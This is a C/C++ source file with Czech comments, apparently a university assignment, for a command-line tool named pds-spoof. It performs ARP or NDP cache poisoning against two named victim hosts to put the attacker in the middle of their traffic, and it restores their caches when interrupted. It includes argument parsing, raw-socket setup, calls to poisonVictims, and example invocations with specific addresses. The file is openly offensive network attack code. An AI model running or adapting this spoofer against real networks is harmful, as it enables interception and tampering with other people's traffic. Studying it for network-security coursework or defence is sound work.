/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/* 
 * File:   pds-spoof.c
 * Author: xstejs24
 *
 * Created on 15. února 2017, 23:35
 */

#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <fstream>
#include <sstream>

#include <net/if.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h> /* the L2 protocols */

#include "pds-library.h"

using namespace std;    // Or using std::string
typedef std::string NetError;

//pcap socket deskriptor
pcap_t* packetDesc;
char interface[255];
char protocol[255];
char victim1ip[255];
char victim2ip[255];
char victim1mac[255];
char victim2mac[255];
u_char intMac[6];

//struktura pro jméno interface
typedef struct{
	int ErrParam;
	int optindNumber;
	int time;
	char interface[255];
	char protocol[255];
	char victim1ip[255];
	char victim2ip[255];
	char victim1mac[255];
	char victim2mac[255];
} PARAMS;

/*
 * Funkce pro ověření číselnosti parametrů.
 * @param argument argument
 */
int parseNumber (char *argument)
{
    char *ptr;
    long arg = strtol(argument, &ptr,10);                   
    if (*ptr != '\0')
		return -1;
    return (int)arg;
}

/*
 * Funkce pro ověření číselnosti parametrů.
 * @param mac MAC adresa
 * Převzato z internetového portálu http://stackoverflow.com
 * Zdroj: http://stackoverflow.com/questions/4792035/how-do-you-validate-that-a-string-is-a-valid-mac-address-in-c
 * Autor: http://stackoverflow.com/users/1583/oded
 */
int isValidMacAddress(const char* mac) {
    int i = 0;
    int s = 0;

    while (*mac) {
       if (isxdigit(*mac)) {
			i++;
       }
       else if (*mac == '.') {
			if (i == 0 || i % 4 != 0)
				break;
          ++s;
       }
       else {
           s = -1;
       }
       ++mac;
    }
//	cerr<<"Hodnoty: "<<i<<":"<<s<<endl;
    return (i == 12 && (s == 2 || s == 0));
}

/*
 * Funkce pro vypsání chybové hlášky pro jednotlivé chyby.
 * @param error Číslo chyby
 */
void printError(int error)
{
	switch(error)
	{
		case ERR_VICMAC1:
			cerr<<"parseParams(): [--victim1mac] Nesprávný formát MAC adresy"<<endl;
			break;
		case ERR_VICMAC2:
			cerr<<"parseParams(): [--victim2mac] Nesprávný formát MAC adresy"<<endl;
			break;
		case ERR_VICIP1:
			cerr<<"parseParams(): [--victim1ip] Nesprávný formát IP adresy (IPv4/IPv6)"<<endl;
			break;
		case ERR_VICIP2:
			cerr<<"parseParams(): [--victim2ip] Nesprávný formát IP adresy (IPv4/IPv6)"<<endl;
			break;
		case ERR_TIME:
			cerr<<"parseParams(): [-t] Nesprávný formát čísla"<<endl;
			break;
		case ERR_PROT:
			cerr<<"parseParams(): [-p] Pouze arp/ndp"<<endl;
			break;
		case ERR_DEF:
			cerr<<"parseParams(): Jiná chyba"<<endl;
			break;
		case ERR_COUNT:
			cerr<<"parseParams(): Nesprávný počet argumentů"<<endl;
		default:
			//return true;
			break;
	}
	// Vypsání použití a ukončení programu
	cerr<<"Použití: pds-spoof -i interface -t sec -p protocol --victim1ip ipaddress --victim1mac macaddress --victim2ip ipaddress --victim2mac macaddress"<<endl;
	exit(EXIT_FAILURE);
}

/**
 * Funkce ověří parametry z příkazové řádky
 * @param argc počet argumentů
 * @param argv pole argumentů
 * @param argInt struktura s názvem interface pro spuštění
 **/
PARAMS getParams (int argc, char *argv[], PARAMS params)
{

	// Vzorové spuštění
	//./pds-spoof -t 10 -p arp -i wlan0 --victim2ip 10.10.10.10 --victim1mac 12:45:ff:ab:aa:cd --victim2ip 192.168.12.14 --victim2mac 12:45:ff:ab:aa:cd	
	int c;
	std::string tokenIP;	// proměnná pro uložení IP adresy
	std::string tokenMAC;	// proměnná pro uložení MAC adresy

	int option_index = 0;
	char tmp[255];
    const char* const short_opts = "i:t:p:";
    const option long_opts[] = {
            {"victim1ip", required_argument, 0, 'a'},
            {"victim1mac", required_argument, 0, 'b'},
            {"victim2ip", required_argument, 0, 'c'},
            {"victim2mac", required_argument, 0, 'd'},
            {"help", 0, 0	, 'h'},
            {0, 0, 0, 0}
    };	
	
	//ověření správnosti a počtu argumentů
	//./pds-spoof -i interface -t sec -p protocol -victim1ip ipaddress -victim1mac macaddress -victim2ip ipaddress -victim2mac macaddress
	while((c = getopt_long_only(argc,argv,short_opts, long_opts, &option_index)) != -1)
	{
		//parametr i + interface_name
		switch(c)
		{
			case 'i':
				strcpy(params.interface, optarg);
				break;
			case 't':
				if((params.time = parseNumber(optarg)) < 0)
					params.ErrParam = ERR_TIME;
				break;
			case 'p':
				strcpy(params.protocol, optarg);
				//if(regex_match(params.protocol,"arp|ARP|NDP|ndp")) // myslím, že není regex naistalovaný na ISA serveru
				if(strcmp(params.protocol,"arp") && strcmp(params.protocol,"ARP") && strcmp(params.protocol,"NDP") && strcmp(params.protocol,"ndp"))
					params.ErrParam = ERR_PROT;
				break;
			case 'a':
				strcpy(params.victim1ip, optarg);
				tokenIP = optarg;
				//ověření, zda je zadaná IP syntakticky správně
				if(!inet_pton(AF_INET,tokenIP.c_str(), &tmp) && !inet_pton(AF_INET6, tokenIP.c_str(), &tmp))
					params.ErrParam = ERR_VICIP1;
				break;
			case 'b':
				strcpy(params.victim1mac, optarg);
				if(!isValidMacAddress(params.victim1mac))
					params.ErrParam = ERR_VICMAC1;
				break;	
			case 'c':
				strcpy(params.victim2ip, optarg);
				tokenIP = optarg;
				//ověření, zda je zadaná IP syntakticky správně
				if(!inet_pton(AF_INET,tokenIP.c_str(), &tmp) && !inet_pton(AF_INET6, tokenIP.c_str(), &tmp))
					params.ErrParam = ERR_VICIP2;
				break;	
			case 'd':
				strcpy(params.victim2mac, optarg);
				if(!isValidMacAddress(params.victim2mac))
					params.ErrParam = ERR_VICMAC2;
				break;			
			case 'h':
				cerr<<"Použití: pds-spoof -i interface -t sec -p protocol --victim1ip ipaddress --victim1mac macaddress --victim2ip ipaddress --victim2mac macaddress"<<endl;
				exit(EXIT_SUCCESS);
			default:
				params.ErrParam = ERR_DEF;
				break;
		}
	}

	// Zakomentovat v případě potřeby testování s méně argumenty
	if(argc != 15)
		params.ErrParam = ERR_COUNT;
	
	params.optindNumber = optind;
	
	// Vypsání chybové hlášky
	if(params.ErrParam != ERR_OK)
		printError(params.ErrParam);
	
	//kontrolní výpis pro jméno interface
	//cerr<<params.interface<<endl;
	
	// vrací se struktura se zpracovanými parametry
	return params;
}


/**
 * Funkce pro ukončení sppoferu. Odešle zpátky zařízením správné pakety.
 * @param signo
 **/
void terminate(int signo)
{
	int sockfd;
	struct sockaddr_ll device;
	
	memset (&device, 0, sizeof (device));
	if ((device.sll_ifindex = if_nametoindex (interface)) == 0) {
		perror ("if_nametoindex() failed to obtain interface index ");
		exit (EXIT_FAILURE);
	}
	
	// Konverze char* na u_char pro MAC adresy
	u_char victim1tmp[ETH_ADDR_LEN];
	createMacAdressFromXML(victim1tmp,(const xmlChar*)victim1mac);
	u_char victim2tmp[ETH_ADDR_LEN];
	createMacAdressFromXML(victim2tmp,(const xmlChar*)victim2mac);
	
	// Vytvoření socketu
	if ((sockfd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) {
		perror ("socket() failed ");
		exit (EXIT_FAILURE);
	}
	
	// Struktura pro informace k odeslání
	device.sll_family = AF_PACKET;
	memcpy (device.sll_addr, intMac, 6 * sizeof (uint8_t));
	device.sll_halen = 6;

	// Vrácení zpátky ARP
	if(strcmp(protocol,"arp") == 0)
	{
		// Zasílání ARP paketů oběma obětem
		usleep(1000000);
		sendPacketARP(victim1tmp,victim1ip,victim2mac,victim2ip,sockfd, device,true);
		sendPacketARP(victim2tmp,victim2ip,victim1mac,victim1ip,sockfd, device,true);
		cerr<<"Ukončuji "<<protocol<<" spoofing"<<endl;
	}
	else
	{
		// Zasílání NDP paketů oběma obětem
		usleep(1000000);
		sendPacketNDP(victim1tmp,victim1ip,victim2mac,victim2ip,sockfd,device,ND_NEIGHBOR_ADVERT);	// Zvrácení účinku otrávení
		sendPacketNDP(victim2tmp,victim2ip,victim1mac,victim1ip,sockfd,device,ND_NEIGHBOR_ADVERT);	// Zvrácení účinku otrávení	
		cerr<<"Ukončuji "<<protocol<<" spoofing"<<endl;
	}

	close(sockfd);

    //zavření spojení
    pcap_close(packetDesc);
//	cerr<<"Signo number: "<<signo<<endl;
//	cerr<<"Func: terminate exit(0)"<<endl;	
    exit(signo);
}

/*
 * 
 */
int main(int argc, char** argv) {
	PARAMS params = {ERR_OK,-1,0,"","","","","",""};
	params = getParams(argc,argv,params);
	
	INTERFACE_INFO* intInfo = (INTERFACE_INFO*)calloc(18, sizeof(INTERFACE_INFO));			// Struktura pro potřebné adresy
	// Získání informací o rozhraní pro scan
	getInterfaceInfo(intInfo,params.interface);
	
	//filtr pro ARP a ICMPv6 (scan)
	//návázání spojení s daným interface
	packetDesc = openInterface(params.interface, "(arp) or (icmp6)",0);
		
	// Globální proměnné pro správné ukončení
	memcpy(victim1mac,params.victim1mac, 255);
	memcpy(victim2mac,params.victim2mac, 255);
	memcpy(victim1ip,params.victim1ip, 255);
	memcpy(victim2ip,params.victim2ip, 255);
	memcpy(protocol,params.protocol, 255);
	memcpy(interface,params.interface, 255);
	memcpy(intMac,intInfo->interfaceMac, 6*sizeof(u_char));
	
	if(params.ErrParam != 0){
		return (EXIT_FAILURE);
	}
	
	//ukončení aplikace
	signal(SIGINT, terminate);
	signal(SIGTERM, terminate);
	signal(SIGQUIT, terminate);	
	
	//sudo ./pds-spoof -i wlo1 -t 5 -p ndp --victim1ip 2a00:1028:9940:5eb6::1 --victim1mac 38:72:C0:5E:B8:A7 --victim2ip 2a00:1028:9940:5eb6:92:9d31:7043:3baf --victim2mac 94:0C:6D:A0:04:5A

	if(strcmp("arp",params.protocol) == 0)
		poisonVictims(intInfo,params.time,params.victim1mac,params.victim2mac,params.victim1ip,params.victim2ip,true);
	else if(strcmp("ndp",params.protocol) == 0)
		poisonVictims(intInfo,params.time,params.victim1mac,params.victim2mac,params.victim1ip,params.victim2ip,false);
	else
		cerr<<"Zadán nepodporovaný protokol! Ukončuji se..."<<endl;
	
	return (EXIT_SUCCESS);
}

